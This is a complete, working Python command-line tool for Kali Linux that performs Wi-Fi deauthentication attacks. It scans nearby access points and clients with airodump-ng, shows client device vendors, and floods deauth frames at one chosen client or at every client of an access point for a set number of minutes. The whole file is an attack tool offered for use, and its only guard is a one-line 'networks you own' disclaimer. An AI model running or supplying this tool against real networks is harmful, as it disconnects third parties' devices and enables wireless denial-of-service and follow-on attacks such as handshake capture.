#!/usr/bin/env python3
"""
mainframe — wifi deauth tool for kali.

surgical: only the interface you pick goes into monitor mode.
your other wifi card stays online.
"""

import argparse
import os
import re
import signal
import subprocess
import sys
import time
from pathlib import Path

# ─── colors ───────────────────────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; B = "\033[1m"; D = "\033[2m"; X = "\033[0m"
CLR = "\033[2J\033[H"

BANNER = rf"""{G}{B}
  __  __  ___ ___ _  _ ___ ___    _   __  __ ___
 |  \/  |/ _ \_ _| \| | __| _ \  /_\ |  \/  | __|
 | |\/| | (_) | || .` | _||   / / _ \| |\/| | _|
 |_|  |_|\___/___|_|\_|_| |_|_\/_/ \_\_|  |_|___|
{X}{D} only touches the interface you pick. keeps you online on the rest.{X}
"""

SCAN_DIR = Path("/tmp/mainframe")


# ─── shell helpers ────────────────────────────────────────────────────────────
def run(cmd, capture=True):
    kw = {"stderr": subprocess.DEVNULL,
          "stdout": subprocess.PIPE if capture else subprocess.DEVNULL}
    r = subprocess.run(cmd, **kw)
    return r.returncode, (r.stdout or b"").decode(errors="ignore")


def need_root():
    if os.geteuid() != 0:
        print(f"{R}needs root. re-run with sudo (or via pkexec / launcher).{X}")
        sys.exit(1)


def need_tools():
    missing = [t for t in ("airodump-ng", "aireplay-ng", "iw", "ip", "nmcli")
               if run(["which", t])[0] != 0]
    if missing:
        print(f"{R}missing tools:{X} {', '.join(missing)}")
        print(f"{D}  apt install aircrack-ng iw iproute2 network-manager{X}")
        sys.exit(1)


# ─── oui vendor lookup ────────────────────────────────────────────────────────
_OUI = None

def load_oui():
    global _OUI
    if _OUI is not None:
        return _OUI
    _OUI = {}
    for path in ("/var/lib/ieee-data/oui.txt", "/usr/share/ieee-data/oui.txt"):
        p = Path(path)
        if not p.exists():
            continue
        pat = re.compile(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+?)\s*$")
        try:
            with p.open(errors="ignore") as f:
                for line in f:
                    m = pat.match(line)
                    if m:
                        _OUI[m.group(1)] = m.group(2)
        except OSError:
            pass
        break
    return _OUI


def vendor_of(mac):
    table = load_oui()
    if not table:
        return ""
    return table.get(mac.upper().replace(":", "")[:6], "")


# ─── display helpers ──────────────────────────────────────────────────────────
def bars(power):
    try:
        p = int(power)
    except (TypeError, ValueError):
        return f"{D}····{X}"
    if p >= -50: return f"{G}▁▃▅▇{X}"
    if p >= -60: return f"{G}▁▃▅·{X}"
    if p >= -70: return f"{Y}▁▃··{X}"
    if p >= -80: return f"{Y}▁···{X}"
    return f"{R}····{X}"


def band_of(ch):
    try:
        c = int(ch)
    except (TypeError, ValueError):
        return "?"
    if 1 <= c <= 14: return "2.4"
    if c >= 36:      return "5"
    return "?"


def header(text):
    print(f"\n{C}{B}━━ {text} ━━{X}")


# ─── interface handling ───────────────────────────────────────────────────────
def list_wireless():
    rc, out = run(["iw", "dev"])
    if rc != 0:
        return []
    ifaces, cur = [], None
    for line in out.splitlines():
        m = re.match(r"\s*Interface (\S+)", line)
        if m:
            if cur:
                ifaces.append(cur)
            cur = {"name": m.group(1), "mode": "?", "driver": "?", "internet": False}
        elif cur:
            mm = re.search(r"type (\S+)", line)
            if mm:
                cur["mode"] = mm.group(1)
    if cur:
        ifaces.append(cur)

    _, route = run(["ip", "route", "show", "default"])
    m = re.search(r"dev (\S+)", route)
    default_iface = m.group(1) if m else None

    for i in ifaces:
        i["internet"] = (i["name"] == default_iface)
        try:
            i["driver"] = Path(f"/sys/class/net/{i['name']}/device/driver").resolve().name
        except OSError:
            pass
    return ifaces


def pick_interface(preselect=None):
    ifaces = list_wireless()
    if not ifaces:
        print(f"{R}no wireless interfaces found. plug in the ar9271?{X}")
        sys.exit(1)

    if preselect:
        for i in ifaces:
            if i["name"] == preselect:
                return i
        print(f"{R}interface {preselect} not found{X}")
        sys.exit(1)

    candidates = [i for i in ifaces if not i["internet"]] or ifaces

    header("wireless interfaces")
    for idx, i in enumerate(candidates):
        flags = []
        if i["internet"]:
            flags.append(f"{R}!! IN USE FOR INTERNET{X}")
        if "ath9k" in i["driver"] or "rtl" in i["driver"]:
            flags.append(f"{G}injection-capable likely{X}")
        flag_str = "  " + " ".join(flags) if flags else ""
        print(f"  {G}[{idx}]{X} {B}{i['name']}{X}  {D}driver:{X} {i['driver']}{flag_str}")

    if len(candidates) == 1:
        print(f"\n{D}auto-picking {candidates[0]['name']} (only candidate){X}")
        return candidates[0]

    while True:
        try:
            n = int(input(f"\n{G}pick> {X}").strip())
            return candidates[n]
        except (ValueError, IndexError):
            print(f"{R}invalid{X}")


# ─── monitor mode (surgical) ──────────────────────────────────────────────────
def enter_monitor(iface):
    name = iface["name"]
    print(f"\n{D}isolating {name} from NetworkManager...{X}")
    run(["nmcli", "device", "set", name, "managed", "no"], capture=False)

    # kill only wpa_supplicant tied to this interface, if any
    rc, out = run(["pgrep", "-af", f"wpa_supplicant.*\\-i.*{name}"])
    for line in out.splitlines():
        pid = line.split()[0] if line.strip() else None
        if pid:
            run(["kill", pid], capture=False)

    run(["ip", "link", "set", name, "down"], capture=False)
    rc, _ = run(["iw", "dev", name, "set", "type", "monitor"])
    if rc != 0:
        print(f"{R}failed to set monitor mode on {name}.{X}")
        print(f"{D}does this adapter support monitor mode?{X}")
        run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
        sys.exit(1)
    run(["ip", "link", "set", name, "up"], capture=False)
    print(f"{G}✓ {name} now in monitor mode (other interfaces untouched){X}")
    return name


def exit_monitor(name):
    print(f"\n{D}restoring {name} to managed mode...{X}")
    run(["ip", "link", "set", name, "down"], capture=False)
    run(["iw", "dev", name, "set", "type", "managed"], capture=False)
    run(["ip", "link", "set", name, "up"], capture=False)
    run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
    print(f"{G}✓ {name} back online.{X}")


# ─── scanning ─────────────────────────────────────────────────────────────────
def scan(mon, seconds, channel=None, label="scanning"):
    SCAN_DIR.mkdir(exist_ok=True)
    for f in SCAN_DIR.glob("scan*"):
        try: f.unlink()
        except OSError: pass

    prefix = str(SCAN_DIR / "scan")
    cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv"]
    if channel:
        cmd += ["-c", str(channel)]
    cmd.append(mon)

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print()
    try:
        for left in range(seconds, 0, -1):
            print(f"  {C}{label}...{X} {D}{left:>3}s left  (ctrl-c to stop early){X}", end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print()
    finally:
        proc.send_signal(signal.SIGINT)
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()
    print(" " * 60, end="\r")

    csv = Path(f"{prefix}-01.csv")
    if not csv.exists():
        return [], []
    return parse_csv(csv.read_text(errors="ignore"))


def parse_csv(raw):
    sections = re.split(r"\r?\n\r?\n", raw)
    aps, clients = [], []
    if sections:
        for line in sections[0].splitlines()[1:]:
            cells = [c.strip() for c in line.split(",")]
            if len(cells) < 14 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
                continue
            essid = cells[13] if cells[13] else "<hidden>"
            aps.append({"bssid": cells[0], "channel": cells[3],
                        "power": cells[8], "essid": essid})
    if len(sections) > 1:
        for line in sections[1].splitlines()[1:]:
            cells = [c.strip() for c in line.split(",")]
            if len(cells) < 6 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
                continue
            clients.append({"mac": cells[0], "power": cells[3], "bssid": cells[5]})
    return aps, clients


# ─── pickers ──────────────────────────────────────────────────────────────────
def pick_ap(aps, all_bands=False):
    if not aps:
        print(f"{R}no APs found. try a longer scan (-s 30).{X}")
        return None

    def pkey(a):
        try: return -int(a["power"])
        except ValueError: return 9999
    aps = sorted(aps, key=pkey)

    if not all_bands:
        aps_24 = [a for a in aps if band_of(a["channel"]) == "2.4"]
        if aps_24:
            aps = aps_24

    header(f"APs nearby  ({'2.4 GHz only — use --all-bands to see 5 GHz' if not all_bands else 'all bands'})")
    for idx, a in enumerate(aps):
        bnd = band_of(a["channel"])
        bnd_col = G if bnd == "2.4" else (Y if bnd == "5" else D)
        essid = a["essid"][:32] or "<hidden>"
        print(f"  {G}[{idx:>2}]{X} {B}{essid}{X}")
        print(f"        {D}{a['bssid']}{X}  ch {a['channel']:>2}  {bnd_col}{bnd} GHz{X}  {bars(a['power'])}  {D}{a['power']} dBm{X}")

    while True:
        s = input(f"\n{G}pick AP> {X}").strip().lower()
        if s in ("q", "quit", "exit"):
            return None
        try:
            chosen = aps[int(s)]
            if band_of(chosen["channel"]) == "5":
                print(f"{Y}warning:{X} that AP is on 5 GHz. AR9271 cannot deauth there.")
                if input(f"{D}continue anyway? [y/N] {X}").strip().lower() != "y":
                    continue
            return chosen
        except (ValueError, IndexError):
            print(f"{R}invalid{X}")


def pick_client(clients, ap):
    matching = [c for c in clients if c["bssid"].lower() == ap["bssid"].lower()]

    header(f"clients on {ap['essid']}")
    if not matching:
        print(f"  {D}none detected yet (clients only show up when transmitting){X}")
    else:
        for idx, c in enumerate(matching):
            v = vendor_of(c["mac"])
            v_str = f"  {C}{v}{X}" if v else ""
            print(f"  {G}[{idx:>2}]{X} {B}{c['mac']}{X}  {bars(c['power'])}{v_str}")

    print(f"\n  {G}[a]{X}  {Y}ALL clients{X} (broadcast deauth — kicks everyone on this AP)")
    print(f"  {G}[r]{X}  rescan for clients (longer)")
    print(f"  {G}[q]{X}  cancel")

    while True:
        s = input(f"\n{G}pick> {X}").strip().lower()
        if s == "q": return "cancel"
        if s == "r": return "rescan"
        if s == "a": return None
        try:
            return matching[int(s)]["mac"]
        except (ValueError, IndexError):
            print(f"{R}invalid{X}")


# ─── deauth ───────────────────────────────────────────────────────────────────
def confirm_deauth(ap, client_mac, duration_min):
    header("confirm")
    print(f"  target AP    : {B}{ap['essid']}{X}  {D}({ap['bssid']}){X}")
    print(f"  channel      : {ap['channel']}  ({band_of(ap['channel'])} GHz)")
    if client_mac:
        v = vendor_of(client_mac)
        v_str = f"  {C}{v}{X}" if v else ""
        print(f"  target client: {B}{client_mac}{X}{v_str}")
    else:
        print(f"  target client: {Y}ALL CLIENTS{X} (broadcast)")
    print(f"  duration     : {duration_min} min")
    return input(f"\n{R}{B}proceed? [y/N] {X}").strip().lower() == "y"


def deauth(mon, ap, client_mac, duration_min):
    run(["iwconfig", mon, "channel", ap["channel"]], capture=False)
    cmd = ["aireplay-ng", "--deauth", "0", "-a", ap["bssid"]]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(mon)

    end = time.time() + duration_min * 60
    print(f"\n{R}{B}>> deauth active. ctrl-c to stop early{X}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while time.time() < end:
            left = int(end - time.time())
            mm, ss = divmod(left, 60)
            print(f"  {R}●{X} deauthing  {B}{mm:02d}:{ss:02d}{X} left   ", end="\r")
            time.sleep(1)
        print()
    except KeyboardInterrupt:
        print(f"\n{Y}stopped early{X}")
    finally:
        proc.terminate()
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()
    print(f"{G}deauth done.{X}")


# ─── main ─────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="surgical wifi deauth")
    p.add_argument("-i", "--iface", help="skip interface picker")
    p.add_argument("-s", "--scan-time", type=int, default=20,
                   help="AP scan duration in seconds (default 20)")
    p.add_argument("-c", "--client-scan-time", type=int, default=30,
                   help="focused client scan duration (default 30)")
    p.add_argument("-t", "--time", type=int, default=10,
                   help="deauth duration in minutes (default 10)")
    p.add_argument("--all-bands", action="store_true",
                   help="show 5 GHz APs too (AR9271 cannot deauth them)")
    args = p.parse_args()

    need_root()
    need_tools()
    print(BANNER)
    print(f"{Y}only on networks you own. you're responsible for what you do.{X}")

    iface = pick_interface(args.iface)
    mon = enter_monitor(iface)

    try:
        # phase 1: wide AP scan
        aps, _ = scan(mon, args.scan_time, label="scanning for APs")
        ap = pick_ap(aps, all_bands=args.all_bands)
        if not ap:
            return

        # phase 2: focused client scan on AP's channel
        while True:
            _, clients = scan(mon, args.client_scan_time,
                              channel=ap["channel"],
                              label=f"scanning clients on ch {ap['channel']}")
            choice = pick_client(clients, ap)
            if choice == "cancel":
                return
            if choice == "rescan":
                continue
            client_mac = choice
            break

        if not confirm_deauth(ap, client_mac, args.time):
            print(f"{D}aborted{X}")
            return

        deauth(mon, ap, client_mac, args.time)

    finally:
        exit_monitor(mon)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}aborted{X}")
        sys.exit(130)
